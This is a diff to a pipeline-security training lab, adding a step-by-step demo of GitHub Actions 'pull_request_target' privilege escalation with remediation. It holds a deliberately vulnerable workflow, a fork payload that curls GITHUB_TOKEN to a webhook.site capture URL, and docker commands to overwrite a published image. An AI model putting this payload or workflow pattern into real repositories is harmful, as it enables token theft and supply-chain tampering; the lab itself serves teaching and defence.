@@ -389,12 +389,191 @@ uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
 ```
 
 ### 9.3 `pull_request_target` privilege escalation
-**What:** If the trigger is changed from `pull_request` to `pull_request_target`, a PR from
-a fork runs with write permissions on the **base** repo, including `GITHUB_TOKEN` with
-`packages: write`.
-**Risk:** A malicious fork PR can overwrite published container images.
-**Demo:** Change the trigger and raise a fork PR; show what the token can reach via the
-GitHub API.
+
+**What:** `pull_request_target` runs the **base repo's** workflow with write-level
+`GITHUB_TOKEN` even when the PR comes from a fork. If the workflow also checks out the
+PR's code and executes it, the attacker's code runs with the elevated token.
+
+**Risk:** A stranger with only a free GitHub account — no SSH key, no PAT, no repo access —
+can exfiltrate `GITHUB_TOKEN` and use it to overwrite published container images, push
+commits, or call any GitHub API the token reaches.
+
+**Requires two roles for the demo:** run the Instructor steps in your normal browser session;
+run the Attacker steps in a separate incognito window logged in as a second GitHub account
+(a throwaway account is fine).
+
+---
+
+#### INSTRUCTOR — prepare the vulnerable workflow (your normal browser / terminal)
+
+**Step 1 — get a capture URL for the demo**
+
+Open https://webhook.site in your browser. Copy the unique URL shown on the page
+(looks like `https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`).
+Every HTTP request to that URL will appear live on the page — this is where the stolen
+token will arrive.
+
+**Step 2 — create a helper script that the workflow will run**
+
+```bash
+cat > /home/kali/Desktop/SecurityLabs/exercise-pipeline-security/scripts/run-checks.sh << 'EOF'
+#!/usr/bin/env bash
+echo "Running pre-merge checks..."
+echo "All checks passed."
+EOF
+chmod +x /home/kali/Desktop/SecurityLabs/exercise-pipeline-security/scripts/run-checks.sh
+```
+
+**Step 3 — create the vulnerable workflow**
+
+> **Note on `GITHUB_TOKEN` visibility:** GitHub Actions does NOT automatically inject
+> `GITHUB_TOKEN` as a shell environment variable. It is only available as
+> `${{ secrets.GITHUB_TOKEN }}` in the YAML expression context. Any `run:` step that
+> needs the token must receive it explicitly via an `env:` block — which is standard
+> practice in real pipelines. That is what makes the attack realistic.
+
+Create `.github/workflows/pr-checks.yml` in the exercise directory:
+
+```yaml
+name: PR Checks
+
+on:
+  pull_request_target:         # ← dangerous: runs with base-repo token, even for forks
+    branches: [main]
+
+jobs:
+  checks:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      packages: write          # elevated — needed for image publishing
+
+    steps:
+      - name: Checkout PR code          # ← dangerous: checks out the ATTACKER's code
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Run checks
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}   # ← explicitly passed to the shell
+        run: bash ./scripts/run-checks.sh   # ← runs whatever the attacker put in that file
+```
+
+**Step 4 — commit and push**
+
+```bash
+cd /home/kali/Desktop/SecurityLabs/exercise-pipeline-security
+git add scripts/run-checks.sh .github/workflows/pr-checks.yml
+git commit -m "Add PR checks workflow"
+git push
+```
+
+---
+
+#### ATTACKER — fork and inject (incognito window, second GitHub account)
+
+The attacker needs nothing except a free GitHub account and a browser.
+No SSH key. No PAT. No access to the target repository.
+
+**Step 1 — fork the repository**
+
+1. Open the target repo: `https://github.com/<instructor-username>/pipeline-security-exercise`
+2. Click **Fork** → **Create fork**
+3. GitHub creates `https://github.com/<attacker-username>/pipeline-security-exercise`
+
+**Step 2 — modify `scripts/run-checks.sh` in the fork**
+
+In the fork, navigate to `scripts/run-checks.sh` and click the pencil (edit) icon.
+Replace the file contents with:
+
+```bash
+#!/usr/bin/env bash
+# Malicious payload — exfiltrates GITHUB_TOKEN to attacker-controlled server
+curl -s "https://webhook.site/YOUR-UUID-HERE" \
+  -d "token=$GITHUB_TOKEN" \
+  -d "repo=$GITHUB_REPOSITORY" \
+  -d "actor=$GITHUB_ACTOR"
+```
+
+Replace `YOUR-UUID-HERE` with the webhook.site URL from Step 1 above.
+
+Commit directly to the fork's `main` branch (default commit message is fine).
+
+**Step 3 — open a pull request**
+
+1. In the fork, click **Contribute → Open pull request**
+2. Title: `Fix: improve pre-merge check output` (innocuous-looking)
+3. Click **Create pull request**
+
+The PR is now open against the instructor's repo. The attacker waits.
+
+---
+
+#### OBSERVE — watch the attack execute
+
+**In your normal browser (instructor view):**
+
+1. Go to the repo's **Actions** tab
+2. The `PR Checks` workflow has started — click it to watch live logs
+3. Notice it runs with the **base repo's context**, not the fork's
+4. The `Run checks` step executes `run-checks.sh` — which is the **attacker's version**
+
+**Switch to webhook.site** — within seconds you will see an incoming request containing:
+
+```
+token=ghs_xxxxxxxxxxxxxxxxxxxxxxxxxxxx
+repo=<instructor-username>/pipeline-security-exercise
+actor=<instructor-username>
+```
+
+The token `ghs_...` is a live `GITHUB_TOKEN` with `packages: write` on the base repo.
+With it, the attacker could run:
+
+```bash
+# Push a backdoored image over the legitimate one
+echo "ghs_xxxx..." | docker login ghcr.io -u <attacker> --password-stdin
+docker pull ubuntu
+docker tag ubuntu ghcr.io/<instructor>/pipeline-security-backend:latest
+docker push ghcr.io/<instructor>/pipeline-security-backend:latest
+```
+
+---
+
+#### REMEDIATION — show the fix
+
+The root cause is the combination of `pull_request_target` + checking out PR code.
+Two safe options:
+
+**Option A — use `pull_request` instead (simplest fix)**
+
+```yaml
+on:
+  pull_request:      # token is read-only, fork PRs get no write access
+    branches: [main]
+```
+
+**Option B — keep `pull_request_target` but never execute PR code**
+
+If you need the elevated token (e.g. to post a review comment), check out the base ref,
+not the PR head:
+
+```yaml
+- uses: actions/checkout@v4
+  # no 'ref:' override — checks out base branch, not the PR's code
+```
+
+Run any untrusted code in a separate job that triggers on `pull_request` with no secrets.
+
+---
+
+#### Cleanup after the demo
+
+```bash
+git rm .github/workflows/pr-checks.yml scripts/run-checks.sh
+git commit -m "Remove vulnerable PR checks workflow (demo cleanup)"
+git push
+```
 
 ### 9.4 Script injection via untrusted input
 **What:** Interpolating `${{ github.event.pull_request.title }}` directly into a `run:`
